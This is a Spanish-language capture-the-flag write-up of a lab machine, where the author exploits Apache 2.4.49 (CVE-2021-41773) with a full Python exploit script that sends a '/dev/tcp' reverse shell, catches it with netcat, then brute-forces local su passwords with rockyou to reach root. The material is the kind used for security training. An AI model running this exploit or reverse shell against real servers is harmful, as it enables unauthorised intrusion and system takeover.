## Reconocimiento:

Puerto 80 : HTTP

En la web hay un blog informativo sobre el comando ping, pero no se ve nada interesante ni en los directorios encontrados con fuzzing. 

Después de un rato me di cuenta que la vulnerabilidad está en la versión de Apache:

```bash
searchsploit apache 2.4.49
```

Hay un RCE (CVE-2021-41773 )

Se puede acceder con ese script en Python bastante fácil, pero tuve problemas para mandarme una shell al host. Así que encontré un script que facilita el envío de Maciferna en su Writeup de esta misma maquina:

```python
import sys
import socket
import re
if len(sys.argv) != 2:
    print(f"\n\n[!] Escriba la dirección ip:\npython3 {sys.argv[0]} 127.0.0.1")
    sys.exit(1)
def send_request(command):
    path = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
    host = sys.argv[1]
    port = 80
    body = f"echo Content-Type: text/plain; echo; {command}"
    content_length = len(body)
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: request\r\n"
        f"Accept: */*\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )
    with socket.create_connection((host, port)) as s:
        s.sendall(request.encode())
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
    final = response.decode(errors="ignore")
    output = re.search(r'text/plain\s*\r?\n\r?\n(.*)', final, re.DOTALL)
    print(output.group(1))
while True:
    try:
        command = input("Escriba el comando a ejecutar o shell para enviar una reverse shell: ")
        if command == "shell":
            port = int(input("Escriba el puerto donde quiere recibirla: "))
            host = input("Escriba su ip: ")
            shell = f'bash -c "bash -i >& /dev/tcp/{host}/{port} 0>&1"'
            send_request(shell)
        else:
            send_request(command)
    except KeyboardInterrupt:
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)
```

Me pongo a la escucha:

```python
nc -nlvp 4444
```

Ejecuto el script:

```bash
python3 exploit.py 172.17.0.2
# Info:
Escriba el comando a ejecutar o shell para enviar una reverse shell: shell
Escriba el puerto donde quiere recibirla: 4444
Escriba su ip: 172.17.0.1
```

## Escalada www-data → punky

No encuentro nada útil, así que toca la clásica de fuerza bruta desde dentro del sistema:

https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh

Me paso el rockyou y la herramienta a la carpeta /tmp del servidor y lo ejecuto:

```bash
bash Su-Force.sh punky rockyou.txt
```

Pass : secret

## Escalada punky → root

Igual, nada interesante y se prueba la misma técnica:

```bash
bash Su-Force.sh root rockyou.txt
```

Pass : hannah

```bash
su root
```

Listo.
